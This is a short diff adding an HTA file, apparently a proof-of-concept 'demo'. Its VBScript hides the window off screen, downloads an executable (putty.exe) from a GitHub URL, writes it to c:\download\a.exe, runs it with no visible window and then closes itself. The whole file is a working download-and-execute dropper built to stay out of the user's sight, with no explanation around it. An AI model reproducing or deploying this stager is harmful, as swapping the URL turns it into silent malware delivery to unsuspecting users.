@@ -1,0 +1,29 @@
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+
+Const adTypeBinary = 1
+Const adSaveCreateOverWrite = 2
+Dim http,ado
+Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
+http.SetOption 2, 13056
+http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
+http.send
+Set ado = createobject("Adodb.Stream")
+ado.Type = adTypeBinary
+ado.Open
+ado.Write http.responseBody
+ado.SaveToFile "c:\download\a.exe"
+ado.Close
+CreateObject("WScript.Shell").Run "c:\download\a.exe",0,true 
+
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD> 
+</HTML>
